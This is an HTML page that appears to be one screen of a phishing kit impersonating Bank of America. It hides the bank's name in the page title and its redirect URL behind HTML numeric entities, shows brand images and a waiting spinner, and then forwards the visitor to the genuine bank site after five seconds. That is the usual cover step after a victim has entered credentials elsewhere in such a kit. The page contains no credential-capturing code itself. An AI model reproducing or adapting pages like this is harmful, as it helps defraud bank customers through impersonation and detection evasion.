<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#66;&#97;&#110;&#107;&#32;&#111;&#102;&#32;&#65;&#109;&#101;&#114;&#105;&#99;&#97;&#32;&#45;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;&#44;&#32;&#67;&#114;&#101;&#100;&#105;&#116;&#32;&#67;&#97;&#114;&#100;&#115;&#44;&#32;&#72;&#111;&#109;&#101;&#32;&#76;&#111;&#97;&#110;&#115;&#32;&#97;&#110;&#100;&#32;&#65;&#117;&#116;&#111;&#32;&#76;&#111;&#97;&#110;&#115;</title>
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<html><meta http-equiv="Refresh" content="05; url=&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#119;&#119;&#119;&#46;&#98;&#97;&#110;&#107;&#111;&#102;&#97;&#109;&#101;&#114;&#105;&#99;&#97;&#46;&#99;&#111;&#109;&#47;"></html>
<style type="text/css">
div#container
{
	position:relative;
	width: 1365px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image4" style="position:absolute; overflow:hidden; left:19px; top:500px; width:1299px; height:152px; z-index:0"><img src="images/m4.png" alt="" title="" border=0 width=1299 height=152></div>

<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:226px; z-index:1"><img src="images/m5.png" alt="" title="" border=0 width=1365 height=226></div>

<div id="image2" style="position:absolute; overflow:hidden; left:617px; top:313px; width:92px; height:92px; z-index:2"><img src="images/wait.gif" alt="" title="" border=0 width=92 height=92></div>

</div>

</body>
</html>
